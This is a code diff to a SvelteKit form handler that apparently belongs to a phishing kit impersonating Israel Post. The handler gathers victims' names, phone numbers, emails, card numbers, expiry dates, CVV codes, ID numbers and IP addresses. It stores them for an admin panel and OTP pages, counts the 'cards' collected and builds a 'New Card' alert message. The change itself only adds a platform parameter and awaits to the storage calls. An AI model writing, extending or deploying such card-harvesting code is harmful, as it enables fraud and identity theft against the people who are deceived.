@@ -4,7 +4,7 @@ import { inc } from '$lib/stats.js';
 import { redirect } from '@sveltejs/kit';
 
 /** @type {import('./$types').RequestHandler} */
-export async function POST({ request, cookies, getClientAddress, url }) {
+export async function POST({ request, cookies, getClientAddress, url, platform }) {
   const data = await request.formData();
 
   const name      = (data.get('name')      ?? '').toString().trim();
@@ -23,8 +23,8 @@ export async function POST({ request, cookies, getClientAddress, url }) {
   const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
 
   // Save session data so admin panel / OTP pages can retrieve it
-  saveData(sessionId, { name, namel, nocphone2, em1, ccnn1, expiry, cvs, id, ip });
-  inc('cards');
+  await saveData(platform, sessionId, { name, namel, nocphone2, em1, ccnn1, expiry, cvs, id, ip });
+  await inc(platform, 'cards');
 
   const message =
 `💳 *New Card — Israel Post*
